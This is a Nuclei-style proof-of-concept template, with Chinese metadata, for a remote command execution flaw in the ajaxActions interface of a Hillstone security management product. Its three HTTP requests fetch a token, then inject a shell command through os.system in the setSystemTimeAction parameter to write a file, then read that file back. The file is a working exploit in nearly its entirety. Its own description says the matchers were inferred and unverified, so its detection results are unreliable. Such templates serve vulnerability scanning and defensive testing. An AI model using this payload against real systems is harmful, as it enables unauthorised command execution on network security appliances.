id: poc-d4c0fc37715e645234aa
info:
  name: 山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'GET /master/ajaxActions/getTokenAction.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip, deflate, br'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /master/ajaxActions/setSystemTimeAction.php?token_csrf=a64cca09285de26ca4ebfefa629edd02 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Length: 90

    Accept: */*

    Accept-Encoding: gzip, deflate, br

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Cookie: PHPSESSID=3ovusd429biqeot6ioje7q06r0


    param=os.system(''echo 8888881 > /opt/var/majorsec/installation/master/runtime/img/config'')'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /master/img/config HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Connection: close

    Accept-Encoding: gzip, deflate, br'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
